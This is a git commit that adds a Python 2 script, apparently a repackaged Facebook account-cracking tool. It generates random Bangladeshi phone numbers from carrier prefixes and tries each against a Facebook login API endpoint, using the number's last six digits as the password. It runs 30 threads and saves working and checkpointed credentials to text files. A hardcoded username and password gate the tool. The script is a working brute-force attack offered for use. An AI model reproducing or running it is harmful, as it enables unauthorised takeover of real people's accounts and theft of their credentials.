e416fcbf416f51b001dc631a3e6e98c22559d5d0
Rynathide <107930445+Rynathid@users.noreply.github.com>
2022-07-28 17:59:23 +0300

    Add files via upload

---
+++ STANLEY.COMPTEFB.RAPIDE.py
@@ -0,0 +1,206 @@
+# Devil Rynathid
+# Decompile by Mardis (JUDICAEL.404)
+# Time Succes decompile : 2022-06-09 19:59:17.533837
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+os.system('clear')
+logo1 ="""
+#FF9F00'########::'##:::'##:'##::: ##::::'###::::'########:'##::::'##:'####:'########::
+ #FFB400##.... ##:. ##:'##:: ###:: ##:::'## ##:::... ##..:: ##:::: ##:. ##:: ##.... ##:
+ #FFA500##:::: ##::. ####::: ####: ##::'##:. ##::::: ##:::: ##:::: ##:: ##:: ##:::: ##:
+#FFBA00 ########::::. ##:::: ## ## ##:'##:::. ##:::: ##:::: #########:: ##:: ##:::: ##:
+ #FF8D00##.. ##:::::: ##:::: ##. ####: #########:::: ##:::: ##.... ##:: ##:: ##:::: ##:
+#FF9900 ##::. ##::::: ##:::: ##:. ###: ##.... ##:::: ##:::: ##:::: ##:: ##:: ##:::: ##:
+ #FFAC00##:::. ##:::: ##:::: ##::. ##: ##:::: ##:::: ##:::: ##:::: ##:'####: ########::
+..:::::..:::::..:::::..::::..::..:::::..:::::..:::::..:::::..::....::........:::
+
+
+"""
+                                                           
+                                                           
+                                                          
+print """
+
+  #FF8A00  _____   __     __  _   _              _______   _    _   _____   _____  
+  #FF7500 |  __ \  \ \   / / | \ | |     /\     |__   __| | |  | | |_   _| |  __ \ 
+ #FF8500  | |__) |  \ \_/ /  |  \| |    /  \       | |    | |__| |   | |   | |  | |
+ #00FF91  |  _  /    \   /   | . ` |   / /\ \      | |    |  __  |   | |   | |  | |
+ #00FF8D  | | \ \     | |    | |\  |  / ____ \     | |    | |  | |  _| |_  | |__| |
+  #00FF8D |_|  \_\    |_|    |_| \_| /_/    \_\    |_|    |_|  |_| |_____| |_____/ 
+                                                                            
+                                                                            
+
+
+
+
+
+mrm = raw_input('\x1b[1;96m[?] \x1b[1;97mEnter Your User Agent \x1b[1;96m>>>> ')
+for n in range(10000):
+    nmbr = random.randint(111111, 999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', mrm + ';]')]
+
+def exb():
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def t():
+    time.sleep(1)
+
+
+def cb():
+    os.system('clear')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+
+logo = """
+#FF00A6'########::'##:::'##:'##::: ##::::'###::::'########:'##::::'##:'####:'########::
+ #FF00DD##.... ##:. ##:'##:: ###:: ##:::'## ##:::... ##..:: ##:::: ##:. ##:: ##.... ##:
+ #FF00D6##:::: ##::. ####::: ####: ##::'##:. ##::::: ##:::: ##:::: ##:: ##:: ##:::: ##:
+ #FF00CB########::::. ##:::: ## ## ##:'##:::. ##:::: ##:::: #########:: ##:: ##:::: ##:
+ #FF00BD##.. ##:::::: ##:::: ##. ####: #########:::: ##:::: ##.... ##:: ##:: ##:::: ##:
+ #FFA4F4##::. ##::::: ##:::: ##:. ###: ##.... ##:::: ##:::: ##:::: ##:: ##:: ##:::: ##:
+#FF00B5 ##:::. ##:::: ##:::: ##::. ##: ##:::: ##:::: ##:::: ##:::: ##:'####: ########::
+..:::::..:::::..:::::..::::..::..:::::..:::::..:::::..:::::..::....::........:::
+
+
+
+
+
+  Auther  :      RYNATHID                          Github  :  Rynathid
+  Whapp   :  +261345897302
+  Contact :  Password Contract Me 
+  
+"""
+                                                          
+                                                           
+
+"""[1;33;40m--------------------------------------------------\n  \x1b[1;36;40mAuthor     \x1b[1;33;40m: \x1b[0;37;40mPIYASH SARDAR\n  \x1b[1;36;40mwhatapp    \x1b[1;33;40m: \x1b[0;37;40m01873615592\n  \x1b[1;36;40mFacebook   \x1b[1;33;40m: \x1b[0;37;40m Piyash Sardar\n  \x1b[1;36;40mPublic     \x1b[1;33;40m: \x1b[0;37;40m12-05-2022\n\x1b[1;33;40m--------------------------------------------------\n  """                            
+
+
+os.system('clear')
+print logo
+CorrectUsername = 'RYNATHID'
+CorrectPassword = 'JUDICAEL'
+loop = 'true'
+while loop == 'true':
+    username = raw_input('\x1b[1;96m[?] \x1b[1;97mTool USERNAME \x1b[1;96m>>>> ')
+    if username == CorrectUsername:
+        password = raw_input('\x1b[1;96m[?] \x1b[1;97mTool PASWORD \x1b[1;96m>>>> ')
+        if password == CorrectPassword:
+            print 'NASA Hacked Successful....'
+            loop = 'false'
+        else:
+            print '\x1b[1;91mWrong!,\x1b[1;92mText me to get the correct password'
+            os.system('xdg-open https://www.facebook.com/minister.facebookingreporter.1')
+    else:
+        print '\x1b[1;91mWrong!,\x1b[1;92mText me to get the correct username'
+        os.system('xdg-open https://www.facebook.com/minister.facebookingreporter.1')
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+
+def menu():
+    global cpb
+    global oks
+    os.system('clear')
+    print logo
+    print '\x1b[1;32;40mEnter Sim Code And + Any \x1b[1;31;40m2 \x1b[1;32;40mDigit Without Space  \n\n\x1b[0;37;45m Grameenphone : 17**,13** \n Robi         : 18** \n Airtel       : 16** \n Banglalink   : 19**,14** '
+    try:
+        c = raw_input(' \n\n\t\x1b[1;32;40mChoose code \x1b[1;31;40m >>>>\x1b[1;35;40m ')
+        k = '+880'
+        idlist = '.txt'
+        for line in open(idlist, 'r').readlines():
+            id.append(line.strip())
+
+    except IOError:
+        print '[!] File Not Found'
+        raw_input('\n[ Back ]')
+        menu()
+
+    xxx = str(len(id))
+    print 50 * '\x1b[1;33;40m-'
+    psb('\x1b[1;32;40m[-_-] Please wait__')
+    psb('[-_-] Total : 99999')
+    time.sleep(0.5)
+    psb('[-_-] Lets Start Hunting')
+    time.sleep(0.5)
+    print 50 * '\x1b[1;33;40m-'
+    psb('\x1b[1;32;40mHacked Accouny Will Appear Here Success id are Just now login & Cp id login after3 days')
+    print
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('Piyash')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + user + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[*_*RYNA Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                okb = open('RYNA/successfull.txt', 'a')
+                okb.write(k + c + user + '|' + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print 'RYNA[(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
+                cps = open('RYNA/checkpoint.txt', 'a')
+                cps.write(k + c + user + '|' + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '-'
+    print '[-_-] Process Has Been Completed ....'
+    print '[-_-] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[-_-] CP File Has Been Saved : save/checkpoint.txt'
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('cat .README.md')
+
+
+if __name__ == '__main__':
+    menu()
